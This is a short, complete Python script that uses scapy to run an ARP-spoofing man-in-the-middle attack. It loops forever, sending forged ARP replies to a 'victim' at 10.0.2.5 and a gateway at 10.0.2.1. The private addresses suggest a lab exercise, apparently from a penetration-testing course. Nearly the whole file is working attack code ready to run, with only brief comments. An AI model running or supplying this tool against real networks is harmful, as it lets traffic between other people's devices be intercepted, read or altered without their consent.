#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast_ether / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    # ARP Response from hacker machine to victim's machine to make an entry in ARP Table for gateway router for both
    # devices in the same subnet
    # packet = scapy.ARP(response op code, destination Ip, destination MAC, Source Ip)
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


sent_packet = 0
while True:
    sent_packet += 2
    spoof("10.0.2.5", "10.0.2.1")
    spoof("10.0.2.1", "10.0.2.5")
    print("\r[+] sent "+str(sent_packet), end="")   # overwrite the last output, end specified what character is to
    # be added at last
    time.sleep(2)
